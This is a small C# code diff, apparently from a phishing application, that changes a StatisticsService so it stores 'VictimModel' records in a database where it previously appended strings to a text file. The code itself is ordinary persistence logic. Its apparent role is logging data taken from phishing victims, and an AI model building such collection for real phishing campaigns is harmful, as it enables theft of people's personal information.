@@ -1,4 +1,7 @@
 ﻿using Common;
+using Contracts.DatabaseModel;
+using DatabaseRepository;
+using PhishingApp.Model;
 using PhishingApp.ViewModel;
 using System;
 using System.Collections.Generic;
@@ -11,12 +14,18 @@ namespace PhishingApp.Commands
 {
 	public class StatisticsService : IFlag
 	{
-		public void SendData(string data)
-		{
 
-			using (StreamWriter sw = new StreamWriter("database.txt", true))
+		public void SendData(VictimModel data)
+		{
+			DataRepository dr = new DataRepository();
+
+			try
 			{
-				sw.WriteLine(data);
+				dr.InsertVictim(data);
+			}
+			catch (InvalidOperationException)
+			{
+				Console.WriteLine("Error during insertVictim");
 			}
 		}
 	}
